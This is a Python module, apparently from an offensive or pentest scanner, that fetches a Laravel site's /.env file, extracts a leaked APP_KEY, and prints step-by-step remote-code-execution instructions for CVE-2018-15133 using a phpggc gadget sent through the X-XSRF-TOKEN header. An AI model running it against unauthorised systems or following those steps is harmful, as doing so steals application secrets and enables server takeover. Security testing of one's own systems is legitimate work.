# serial-rce.py — RCE عبر unserialize (CVE-2018-15133)
from core.registry import module
from core.http import get

@module("serial-rce", "laravel", "RCE عبر unserialize (APP_KEY)")
def run(base, a, R):
    st, _, b = get(base + "/.env")
    if st != 200 or "APP_KEY" not in b:
        R.info("APP_KEY غير مسرّب — الثغرة غير قابلة للاستغلال من الخارج")
        return
    import re
    m = re.search(r"APP_KEY=base64:([A-Za-z0-9+/=]{40,})", b)
    if m:
        R.vuln("CRITICAL: APP_KEY مسرّب — CVE-2018-15133 (Laravel ≤5.6.29):")
        R.vuln("  استخدم phpggc مع gadget Laravel/RCE ثم اشفر بـ APP_KEY عبر X-XSRF-TOKEN")
        R.info("  الخطوات: phpggc Laravel/RCE/x -p phar -o payload; قم بتشفيره وتحميله عبر رأس X-XSRF-TOKEN")
    else:
        R.warn("APP_KEY موجود بصيغة مختلفة — قد يكون غير قابل للاستغلال مباشرة")
